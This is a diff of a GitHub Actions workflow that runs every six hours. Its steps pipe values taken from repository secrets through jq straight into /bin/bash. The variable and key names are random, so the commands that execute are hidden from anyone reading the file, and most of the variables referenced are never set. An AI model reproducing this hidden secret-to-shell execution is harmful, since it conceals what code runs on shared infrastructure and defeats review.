@@ -1,25 +1,21 @@
 name: taofeiji3489
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 1/6 * * *'
+    - cron: '12 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: taofeiji3489
         env:
-          jlwdw37: ${{ secrets.jlwdw37 }}
+          g57: ${{ secrets.g57 }}
         run: |
-          echo $jlwdw37 | jq -r .g9 | /bin/bash
-          echo $ebvn14480 | jq -r .jwfw66572 | /bin/bash
-          echo $tbabc71 | jq -r .ssaq9 | /bin/bash
-          echo $ic404 | jq -r .nc0278 | /bin/bash
-          echo $f44381 | jq -r .andga899 | /bin/bash
-          echo $ia82065 | jq -r .e03452 | /bin/bash
-          echo $mqqa24109 | jq -r .y3748 | /bin/bash
-          echo $znj324 | jq -r .fg20 | /bin/bash
-          echo $wj05992 | jq -r .wd265 | /bin/bash
+          echo $g57 | jq -r .gyfa75 | /bin/bash
+          echo $v87522 | jq -r .q7 | /bin/bash
+          echo $keliu67565 | jq -r .vlmg698 | /bin/bash
+          echo $snf17 | jq -r .tvvrk3 | /bin/bash
+          echo $j5154 | jq -r .cdg91404 | /bin/bash
 
